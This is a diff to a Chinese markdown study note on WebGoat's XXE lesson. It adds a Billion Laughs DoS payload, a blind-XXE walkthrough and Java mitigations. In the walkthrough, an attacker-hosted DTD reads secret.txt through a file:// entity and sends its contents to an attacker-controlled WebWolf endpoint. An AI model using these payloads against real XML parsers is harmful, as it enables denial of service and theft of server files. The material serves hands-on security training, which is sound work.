@@ -1,9 +1,9 @@
 ---
-id: 
+id: CWE-611
 title: XXE
 ---
 <!-- muse start -->
-Web Goat 的 XXE 简介，包含编程语言对 XML 的处理，修改请求体类型以发送预期外格式。
+Web Goat 的 XXE 简介，包含编程语言对 XML 的处理，修改请求体类型以发送预期外格式，盲 XXE 的带外数据窃取。
 从原格式的普通输入开始，逐步修改并根据响应（错误信息）探测与调整载荷。
 <!-- muse end -->
 
@@ -357,4 +357,165 @@ Content-Type: application/xml
 
 在某些企业的网络环境中，如果此载荷通过HTTP发送，某些网络设备可能会完全丢弃它。这种情况下`POST`请求不会收到响应，端点也永远不会收到该请求。然而，这类防护措施作用有限，因为在HTTPS设置中，相同的请求会成功通过，因为载荷会被加密传输。
 
-## 9. TODO
+## 9. XXE DOS attack
+
+使用与 XXE 攻击相同的技术，我们可以对服务器发起拒绝服务（DoS）攻击。这种攻击的一个例子是：
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+
+当 XML 解析器加载此文档时，它会看到根元素 `lolz` 包含文本 `&lol9;`。然而，`&lol9;` 是一个已定义的实体，它会展开为一个包含十个 `&lol8;` 字符串的字符串。每个 `&lol8;` 字符串又是一个已定义的实体，会展开为十个 `&lol7;` 字符串，以此类推。在所有实体展开完成后，这个小于 1KB 的 XML 块实际上会占用近 3GB 的内存。
+
+这种攻击被称为“十亿次笑声”（Billion Laughs），更多信息可以在这里找到：https://en.wikipedia.org/wiki/Billion_laughs
+
+## 10. 盲XXE（Blind XXE）
+
+在某些情况下，您可能看不到任何输出，因为尽管您的攻击可能已生效，但该字段未在页面输出中反映出来。或者您尝试读取的资源包含非法的XML字符，导致解析器失败。让我们从一个示例开始，在这种情况下，我们引用一个在我们自己服务器上控制的外部DTD。
+
+作为攻击者，您控制着WebWolf（这可以是您控制的任何服务器），例如，您可以使用此服务器通过 `http://127.0.0.1:9090/WebWolf/home` 向其发送请求。
+
+我们如何使用这个端点来验证是否能够执行XXE？
+
+我们可以再次使用WebWolf来托管一个名为 `attack.dtd` 的文件，创建此文件并包含以下内容：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY ping SYSTEM "http://127.0.0.1:9090/WebWolf/landing">
+```
+
+现在提交表单，将XML更改为：
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "webWolfLink:[webWolfLink]">
+%remote;
+]>
+<comment>
+  <text>test&ping;</text>
+</comment>
+```
+
+现在在WebWolf中浏览到“传入请求”，您将看到：
+
+```json
+{
+  "method" : "GET",
+  "path" : "/landing",
+  "headers" : {
+    "request" : {
+      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
+    },
+  },
+  "parameters" : {
+    "test" : [ "HelloWorld" ],
+  },
+  "timeTaken" : "1"
+}
+```
+
+因此，通过XXE，我们能够向我们自己的服务器发送请求，这意味着XXE注入是可能的。所以通过XXE注入，我们基本上能够达到与最初使用curl命令相同的效果。
+
+## 11. 盲XXE（Blind XXE）任务
+
+在上一页中，我们向您展示了如何使用 XXE 攻击向服务器发送请求。在此任务中，请尝试创建一个 DTD，该 DTD 将把 WebGoat 服务器上 `secret.txt` 文件的内容上传到我们的 WebWolf 服务器。您可以使用 WebWolf 来托管您的 DTD 文件。`secret.txt` 文件位于 WebGoat 服务器的以下位置，因此您无需扫描所有目录和文件：
+
+| 操作系统 | 位置                                                                   |
+| :------- | :--------------------------------------------------------------------- |
+| Linux    | `/home/webgoat/.webgoat-2025.3/XXE/apkallus/secret.txt`               |
+
+使用 WebWolf 的着陆页（例如：`http://127.0.0.1:9090/WebWolf/landing`）来上传此文件（注意：此端点完全由您控制）。一旦您获取了文件内容，请将其作为新评论发布在页面上，您将完成本课程。
+
+发送测试消息
+```http
+POST /WebGoat/xxe/blind HTTP/1.1
+Host: localhost:3000
+Content-Type: application/xml
+
+<?xml version="1.0"?><comment>  <text>foooooooooo</text></comment>
+```
+
+构建攻击者控制服务器的 `attack.dtd`，并上传到 WebWolf：
+1. 定义实体`file`，包含来自目标路径的文件内容
+2. 定义实体`eval`，包含对实体`exfiltrate`的动态声明。
+  `exfiltrate`实体对 `WebWolf/landing/文件内容` 发起 HTTP 请求，攻击者服务器 URL 的参数包含文件内容
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-2025.3/XXE/apkallus/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://127.0.0.1:9090/WebWolf/landing/%file;'>">
+%eval;
+%exfiltrate;
+```
+
+构建对应用程序的载荷：
+1. 声明实体 `xxe`，设置攻击者服务器的 DTD URL
+2. 使用实体 `xxe`，从攻击者的 DTD URL 获取实体后内联解释
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://127.0.0.1:9090/WebWolf/files/apkallus/attack.dtd"> %xxe;]>
+```
+
+查看 Web Wolf 的请求记录
+`/WebWolf/landing/WebGoat 8.0 rocks... (qETcoXPesA)`
+提交后通过挑战
+
+
+## 12. XXE 防护措施
+
+为防范 XXE 攻击，需确保对来自不可信客户端的输入进行验证。在 Java 技术栈中，可配置解析器完全忽略 DTD，例如：
+
+```java
+XMLInputFactory xif = XMLInputFactory.newFactory();
+xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
+```
+
+若无法完全禁用 DTD 支持，也可指令 XML 解析器忽略外部实体，例如：
+（此时暴露于内部 DTD 风险）
+
+```java
+XMLInputFactory xif = XMLInputFactory.newFactory();
+xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
+xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
+```
+
+有关配置的更多信息，请参阅 [OWASP XXE 防护手册](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)。
+
+### 验证
+
+对 Content-Type 和 Accept 请求头实施严格验证，切勿仅依赖框架处理传入请求。若客户端未提供合规的 Accept 请求头，应返回 `406/不可接受` 状态码。
+
+## 13. 使用静态代码分析发现 XXE 问题
+
+静态代码分析有助于识别代码中的安全漏洞。SonarQube 是一款知名的静态代码分析工具。当您对 WebGoat 的源代码执行扫描时，将得到类似以下的结果：
+
+![sonar-issues.png](./images/sonar-issues.png)
+*Web Goat: sonar-issues.png*
+
+如果选择 XXE 分类，工具将显示 XXE 漏洞的具体位置。
+
+![sonar-issue-xxe.png](./images/sonar-issue-xxe.png)
+*Web Goat: sonar-issue-xxe.png*
+
+下一步是判断该问题属于真实漏洞还是误报。正如您已从挑战练习中了解到的，这是一个真实存在的漏洞（本例中为故意植入）。
+
+SonarQube 同时会给出修复建议。
+
+![xxe-suggested-fix.png](./images/xxe-suggested-fix.png)
+*Web Goat: xxe-suggested-fix.png*
+
+点击下方按钮后，您可以重新尝试 XXE 挑战，将会发现相关漏洞已得到缓解。
